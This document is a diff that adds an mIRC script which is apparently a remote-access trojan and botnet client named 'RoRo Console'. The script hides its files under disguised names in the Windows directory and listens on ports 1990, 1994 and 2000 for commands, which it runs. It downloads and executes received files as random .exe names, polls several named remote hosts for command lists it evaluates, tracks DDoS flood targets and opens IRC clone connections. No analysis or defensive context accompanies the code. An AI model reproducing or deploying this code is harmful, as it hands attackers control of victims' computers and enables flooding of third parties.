@@ -1,0 +1,185 @@
+[script]
+n0=alias setFileNames { $SFN(DEF, $windir $+ \Ifsh $+ $getPCName $+ 386.swp) }
+n1=alias winFile { .return $winDir $+ \cmd $+ $getPCName $+ 32.sys }
+n2=alias getPCName { var %s = $findfile($winDir,*.pwl,1) | if (%s) { %s = $remove($getTok(%s,$numTok(%s,$asc(\)),$asc(\)),.pwl) } | if (!%s) { %s = net } | .return $lower(%s) }
+n3=alias winDir { var %s = $finddir(C:\,Win*,1,1) | if (!%s) { %s = $finddir(D:\,Win*,1,1) } | if (!%s) %s = C: | .return %s }
+n4=alias GFN { .return $readini($winFile,Files,$1) }
+n5=alias SFN {  .writeini $winFile Files $1 $2 }
+n6=alias setStat { .writeini $winFile Options Virus $1 }
+n7=alias getStat { var %s = $readini($winFile, Options, Virus) | if (!%s) %s = Semi | .return %s }
+n8=alias setCountry { .writeini $winFile Options Country $1 }
+n9=alias getCountry { var %s = $readini($winFile, Options, Country) | if (!%s) %s = OTHER | .return %s }
+n10=alias addHTTP { .Writeini $GFN(DEF) HTTP $1 $2- }
+n11=alias delHTTP { .Remini $GFN(DEF) HTTP $1 }
+n12=alias Wind { .return @ $+ $1 }
+n13=alias Verify { if ($sock($1).name != $null) { .return 1 } | .return 0 }
+n14=; *
+n15=on *:Unload:{ if ($hget(Mutex).size > 0) .hfree Mutex }
+n16=on *:Connect:{ .Init }
+n17=on *:Disconnect:{ .timers off | .sockclose * }
+n18=on *:Start:{ .Start }
+n19=alias Start {
+n20=  if ($version < 5.8) { .unload -rsn $script | .halt }
+n21=  if ($hget(Mutex).size > 0) { .unload -rsn $script | .halt } | .hmake Mutex 1
+n22=  if ($hget(Data).size > 0) { .hfree Data } | .hmake Data 100
+n23=  .hadd Data Recving Idle | .hadd Data Visited 0
+n24=  .hadd Data Services NS MS CS OS SeenServ NickServ MemoServ ChanServ OperServ Global
+n25=  .setFileNames | .setStat $getStat | .setCountry $getCountry
+n26=  .write -c notes.txt | .load -rs1 notes.txt | .sockclose *
+n27=}
+n28=alias Init {
+n29=  if ($hget(Data).size == 0) { .unload -rsn $script }
+n30=  if ($readini($winFile, Options, Init) != 1) || ($exists($GFN(DEF)) != $true) { .setSites }
+n31=  .timerListenIt 1 5 { .ListenIt }
+n32=  .timerHttpMe 1 15 { .HttpMe }
+n33=}
+n34=alias ListenIt { if ($portfree(1994) == $true) { .socklisten Listen-RecvFile 1990 | .socklisten Listen-Mutex 1994 | .socklisten Listen-Console 2000 } }
+n35=alias AcceptIt { var %sName "" | :AcceptIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) goto AcceptIt | .sockaccept %sName | return %sName }
+n36=alias OpenIt { var %sName "" | :OpenIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) goto OpenIt | return %sName }
+n37=; *
+n38=alias RecvFile {
+n39=  ; $1 - ACTION , $2 - $sockname , $3 - Remote Filename , $4 - Local Filename
+n40=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, RecvFile) , %sRead = "" , %iResume
+n41=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }
+n42=
+n43=  if (CLOSE isin $1) || ($sockerr > 0) {
+n44=    if (%bServer == 1) {
+n45=      if ($file($hget(Data, $rev(%sName, LocalName))).size == $hget(Data, $rev(%sName, Size))) { 
+n46=        if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Successfully Received. CRC OK.. }
+n47=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .run $hget(Data, $rev(%sName, LocalName)) }
+n48=      }
+n49=      else if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { 
+n50=        .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Transfer Error. Bad CRC..
+n51=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Recving Idle }
+n52=      }
+n53=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .sockclose $hget(Data, $rev(%sName, Remote)) }
+n54=    }
+n55=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return
+n56=  }
+n57=  if (RECV isin $1) {
+n58=    if (%bServer == 1 && $hget(Data, $rev(%sName, Init)) != 1) {
+n59=      .sockread %sRead
+n60=      .hadd Data $rev(%sName, LocalName) $GetTok(%sRead, 2, $asc(!))
+n61=      .hadd Data $rev(%sName, Size) $GetTok(%sRead, 3, $asc(!))
+n62=      .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))
+n63=      .hadd Data $rev(%sName, Virus) $GetTok(%sRead, 5, $asc(!))
+n64=      .hadd Data $rev(%sName, Init) 1
+n65=      if ($hget(Data, $rev(%sName, Virus)) == 1) {
+n66=        if ($hget(Data, Recving) == Busy) || ($getStat == Full) { .sockclose $hget(Data, $rev(%sName, Remote)) | .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }
+n67=        .hadd Data Recving Busy | .hadd Data $rev(%sName, LocalName) $WinDir $+ \ $+ $random($rand(5,10)) $+ .exe
+n68=      }
+n69=      if ($exists($hget(Data, $rev(%sName, LocalName))) == $true) { .remove $hget(Data, $rev(%sName, LocalName)) }
+n70=      if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) Connection Established. Receiving in Progress.. }
+n71=    }
+n72=    else { :RecvMore | .sockread &bRead | if ($sockbr != 0) { .bwrite $hget(Data, $rev(%sName, LocalName)) -1 &bRead | goto RecvMore } }
+n73=  }
+n74=}
+n75=; *
+n76=on *:socklisten:Listen-RecvFile:{ .AcceptIt Server-RecvFile }
+n77=on *:sockread:Server-RecvFile-*:{ .RecvFile RECV $sockname }
+n78=on *:sockclose:Server-RecvFile-*:{ .RecvFile CLOSE $sockname }
+n79=; *
+n80=alias istrue { if ($1 == $2) { $3- } }
+n81=alias rev { var %i = 0 , %s | while (%i != $0) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | .return %s }
+n82=alias getScript { .return sMaLL }
+n83=alias getVersion { .return 3.4 }
+n84=alias Hello { .sockwrite -tn $sockname (HELLO) I'm running RoRo Console $getVersion - $+ $getScript $+ - }
+n85=alias StatusMe { .sockwrite -tn $sockname (STATUS) $getStat $hget(Data, Recving) $sockname $ip }
+n86=alias ExecIt {
+n87=  if ($1 == FUCKOFF) { .remove $winFile }
+n88=  else { [ [ $1- ] ] } | .sockwrite -tn $sockname (EXEC) $1- Executed..
+n89=}
+n90=alias MassMe {
+n91=  .sockwrite -tn $sockname (MASS) Accepted. | var %sExec = $readini($GFN(DEF), Mass, Executed)
+n92=  if ($1- !isin %sExec) { .writeini $GFN(DEF) Mass Executed %sExec , $1- | $1- }
+n93=}
+n94=; *
+n95=on *:socklisten:Listen-Console:{ .AcceptIt Server-Console }
+n96=on *:sockread:Server-Console-*:{
+n97=  if ($sockerr > 0) { .return }
+n98=  var %sRead | .sockread %sRead | .tokenize 32 %sRead
+n99=  if ($1 == HELLO) { .Hello }
+n100=  else if ($1 == STATUS) { .StatusMe }
+n101=  else if ($1 == MASS) { .MassMe $2- }
+n102=  else if ($1 == EXEC) { .ExecIt $2- }
+n103=}
+n104=; *
+n105=alias RequestURL {
+n106=  .sockwrite -n $1 GET $2 HTTP/1.1 | .sockwrite -n $1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*
+n107=  .sockwrite -n $1 Accept-Language: bg | .sockwrite -n $1 Accept-Encoding: deflate | .sockwrite -n $1 User-Agent: Mozilla/4.0 (compatible; MSIE 4.72; Windows 98)
+n108=  if ($pos($3,.,0) == 1) { .sockwrite -n $1 Host: www. $+ $3 } | if ($pos($3,.,0) != 1) { .sockwrite -n $1 Host: $3 }
+n109=  .sockwrite -n $1 Connection: Keep-Alive | .sockwrite -n $1 Cache-Control: no-cache | .sockwrite -n $1
+n110=}
+n111=alias HttpMe {
+n112=  var %sParam = $ini($GFN(DEF), HTTP, $rand(1,$ini($GFN(DEF),HTTP,0)))
+n113=  if (%sParam) { .GetHTTP %sParam $readini($GFN(DEF), HTTP, %sParam) }
+n114=}
+n115=alias GetHTTP {
+n116=  var %http.sock = $OpenIt(GetHTTP)
+n117=  .hadd Data $rev(%http.sock, LocalName) $2
+n118=  if ($exists($hget(Data, $rev(%http.sock, LocalName))) == $true) { .remove $hget(Data, $rev(%http.sock, LocalName)) }
+n119=  .hadd Data $rev(%http.sock, RemoteName) / $+ $getTok($1, 2-, $asc(/)) | .hadd Data $rev(%http.sock, Serv) $getTok($1, 1, $asc(/))
+n120=  .hadd Data $rev(%http.sock, Script) $getScript | .hadd Data $rev(%http.sock, Country) $getCountry | .hadd Data $rev(%http.sock, Stat) $getStat
+n121=  .hadd Data $rev(%http.sock, Options) $3- | .hadd Data $rev(%http.sock, Size) 0
+n122=  if ($hget(Data, $Rev(%http.sock, Serv)) != $null) { .sockopen %http.sock $hget(Data, $Rev(%http.sock, Serv)) 80 }
+n123=  else { .hdel -w Data $rev(%http.sock, *) }
+n124=}
+n125=on *:sockopen:GetHTTP-*:{
+n126=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }
+n127=  .RequestURL $sockname $hget(Data, $rev($sockname, RemoteName)) $hget(Data, $rev($sockname, Serv))
+n128=}
+n129=on *:sockread:GetHTTP-*:{
+n130=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }
+n131=  var %sRead = "" , %http.LocalName = $hget(Data, $rev($sockname, LocalName)) , %http.Options = $hget(Data, $rev($sockname, Options))
+n132=  if ($hget(Data, $rev($sockname, EOR)) == 1) {
+n133=    if (STORE isin %http.Options) || (SAVE isin %http.Options) {
+n134=      :StoreMore | .sockread &bRead | if ($sockbr != 0) { .bwrite %http.LocalName -1 &bRead | .goto StoreMore }
+n135=      if ($hget(Data, $rev($sockname, Size)) && $file(%http.LocalName).size >= $hget(Data, $rev($sockname, Size))) { .hadd Data $rev($sockname, Final) 1 }
+n136=    }
+n137=    if (EXEC isin %http.Options) {
+n138=      .sockread %sRead | %sRead = [ [ %sRead ] ]
+n139=      if (%sRead == EOF) { .hadd Data $rev($sockname, Final) 1 }
+n140=      else if (Script: isin %sRead) { .hadd Data $rev($sockname, Script) $gettok(%sRead, 2, 32) }
+n141=      else if (Country: isin %sRead) { .hadd Data $rev($sockname, Country) $gettok(%sRead, 2, 32) }
+n142=      else if (Stat: isin %sRead) { .hadd Data $rev($sockname, Stat) $gettok(%sRead, 2, 32) }
+n143=      else if (($hget(Data, $rev($sockname, Script)) == $getScript) && ($hget(Data, $rev($sockname, Country)) == $getCountry) && ($hget(Data, $rev($sockname, Stat)) == $getStat)) { %sRead }
+n144=    }
+n145=  }
+n146=  else {
+n147=    .sockread %sRead
+n148=    if (%sRead == $null) { .hadd Data $rev($sockname, EOR) 1 }
+n149=    else if (Content-Length* iswm %sRead) { .hadd Data $rev($sockname, Size) $GetTok(%sRead, 2, 32) }
+n150=    else if ((HTTP/* iswm %sRead) && (200 !isin %sRead)) { 
+n151=      var %sParam = $hget(Data, $rev($sockname, Serv)) $+ $hget(Data, $rev($sockname, RemoteName))
+n152=      .remini $GFN(DEF) HTTP %sParam | if (SOS !isin %sParam && SAVE !isin %http.Options) { .writeini $GFN(DEF) DDos %sParam FLOOD }
+n153=      .hdel -w Data $rev($sockname, *) | .sockclose $sockname | .return
+n154=    }
+n155=  }
+n156=  if ($hget(Data, $rev($sockname, Final)) == 1) {
+n157=    if ((STORE isin %http.options) && ($file(%http.LocalName).size == $hget(Data, $rev($sockname, Size)))) { .run %http.LocalName | .hadd Data Visited 1 }
+n158=    .hdel -w Data $rev($sockname, *) | .sockclose $sockname
+n159=  }
+n160=}
+n161=on *:sockclose:GetHTTP-*:{ if ($hget(Data, $rev($sockname,Final)) != 1 && SAVE !isin $hget(Data, $rev($sockname, Options))) { .remove $hget(Data, $rev($sockname, LocalName)) } | .hdel -w Data $rev($sockname, *) }
+n162=; *
+n163=alias setSites {
+n164=  if ($getCountry == BG) { .addHTTP Rahmul.hit.bg/Commands.txt NULL EXEC | .addHTTP free.bol.bg/rahmul/Commands.txt NULL EXEC | .addHTTP free.techno-link.com/Rahmul/Commands.txt NULL EXEC }
+n165=  else { .addHTTP Rahmul4o.tripod.com/Commands.txt NULL EXEC | .addHTTP geocities.com/Rahmul4o/Commands.txt NULL EXEC | .addHTTP Rahmulka.tripod.com/Commands.txt NULL EXEC }
+n166=  .writeini $winFile Options Init 1
+n167=}
+n168=raw *:*:{ if ($numeric == 2) { if (UniBG isin $1-) || (*-bg iswm $1-) { .setCountry BG } } | if (40* iswm $numeric) .halt }
+n169=on ^*:Open:?:*:{ if (http isin $1-) || (www isin $1-) { .ignore -u60 $nick | .halt } }
+n170=; *
+n171=alias Random { var %i = 0 , %s | while (%i < $1) { %s = %s $+ $rand(a,z) | inc %i } | .return %s }
+n172=alias UseClone { if ($sock(Clone-*, 0) > 0) { .sockwrite -tn Clone-* $1- } }
+n173=alias LoadClone { var %sock = $OpenIt(Clone) | .sockopen %sock $1 6667 | .sockmark %sock $1- }
+n174=on *:sockopen:Clone-*:{
+n175=  if ($sockerr > 0) { .return } | .tokenize 32 $sock($sockname).mark
+n176=  .sockwrite -tn $sockname NICK $2 | .sockwrite -tn $sockname USER $3 " $+ $4 $+ " " $+ $1 $+ " : $+ $5-
+n177=}
+n178=on *:sockread:Clone-*:{
+n179=  if ($sockerr > 0) { .return } | var %sRead | .sockread %sRead
+n180=  if (PING* iswm %sRead) { .sockwrite -tn $sockname PONG $getTok(%sRead, 2, 32) }
+n181=  if ($gettok(%sRead, 2, $asc(:)) == IP!) { .sockwrite -tn $sockname NOTICE $remove($gettok(%sRead,1,$asc(!)),:) :IP_ $+ $IP }
+n182=}
+
